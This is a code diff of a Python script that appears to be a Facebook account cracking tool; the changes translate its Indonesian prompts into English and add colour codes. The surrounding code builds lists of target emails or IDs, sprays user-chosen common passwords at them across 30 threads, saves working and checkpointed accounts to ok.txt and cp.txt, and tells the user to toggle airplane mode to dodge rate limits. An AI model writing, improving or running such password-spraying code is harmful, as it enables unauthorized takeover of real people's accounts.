@@ -77,7 +77,7 @@ class Main:
 				print(" [!] TURN ON AIRPLANE MODE FOR (5 Sec )\n")
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
-			exit("\n\n [#] crack selesai...")
+			exit("\n\n [#] CRACK COMPLETE...")
 		except Exception as e:exit(str(e))
 	
 	def fbmuda(self):
@@ -102,7 +102,7 @@ class Main:
 				print(" \033[0;91m[!]\033[0;97m TURN ON AIRPLANE MODE FOR (5 Sec )\n")
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
-			exit("\n\n [#] crack selesai...")
+			exit("\n\n [#] CRACK COMPLETE...")
 		except Exception as e:exit(str(e))
 
 	def fbtua(self):
@@ -127,14 +127,14 @@ class Main:
 				print(" \033[0;91m[!]\033[0;97m TURN ON AIRPLANE MODE FOR (5 Sec )\n")
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
-			exit("\n\n [#] crack selesai...")
+			exit("\n\n [#] CRACK COMPLETE...")
 		except Exception as e:exit(str(e))
 	def email(self):
 		x = 111
 		xx = 999
-		nama = input(" [?] masukan nama (cth: angga): ")
+		nama = input(" \033[0;91m[?]\033[0;97m PUT ANY NAME (EG: baloch): ")
 		nama = nama.replace(" ", "")
-		domain = input(" [?] [G]mail.com, [Y]ahoo.com, [H]otmail.com : ")
+		domain = input(" \033[0;91m[?]\033[0;97m [G]mail.com, [Y]ahoo.com, [H]otmail.com : ")
 		if domain in [""]:Main()
 		elif domain in ["G", "g"]:
 			idx = "@gmail.com"
@@ -143,26 +143,26 @@ class Main:
 		elif domain in ["H", "h"]:
 			idx = "@hotmail.com"
 		else:Main()
-		limit = int(input(" [+] masukan jumlah id (cth 5000): "))
+		limit = int(input(" \033[0;91m[+]\033[0;97m TOTAL IDS TO CRACK (LIMIT 5000): "))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
 				__ = idx
 				___ = nama
 				self.id.append(___+str(_)+__)
-			print(" [+] total id -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
+			print(" \033[0;91m[+]\033[0;97m TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n [!] gunakan , (koma) untuk pemisah contoh : 123456,123456789")
-				listpass = input(" [?] masukan kata sandi : ")
+				print("\n \033[0;91m[!]\033[0;97m CHOOSE ANY PASSWARD EXAMPLE : 123456,123456789")
+				listpass = input(" \033[0;91m[?]\033[0;97m PASSWARD YOU CHOOSE : ")
 				if len(listpass)<=5:
-					exit("\n [!] kata sandi minimal 6 karakter")
-				print(" [*] crack dengan sandi -> [\033[0;91m%s\033[0;97m]"%(listpass))
-				print("\n [+] hasil ok tersimpan di -> ok.txt")
-				print(" [+] hasil cp tersimpan di -> cp.txt")
-				print(" [!] jika tidak ada hasil hidupkan mode pesawat 5 detik\n")
+					exit("\n \033[0;91m[!]\033[0;97m PASS MUST BE 6 DIGITS")
+				print(" \033[0;91m[*]\033[0;97m PASSWARD START CRACK -> [\033[0;91m%s\033[0;97m]"%(listpass))
+				print("\n \033[0;91m[+]\033[0;97m ACOUNT OK SAVE -> ok.txt")
+				print(" \033[0;91m[+]\033[0;97m ACOUNT CP SAVE -> cp.txt")
+				print(" \033[0;91m[!]\033[0;97m TURN ON AIRPLANE MODE FOR (5 Sec )\n")
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
-			exit("\n\n [#] crack selesai...")
+			exit("\n\n [#] CRACK COMPLETE...")
 		except Exception as e:exit(str(e))
 
 	def api(self, uid, pwx):
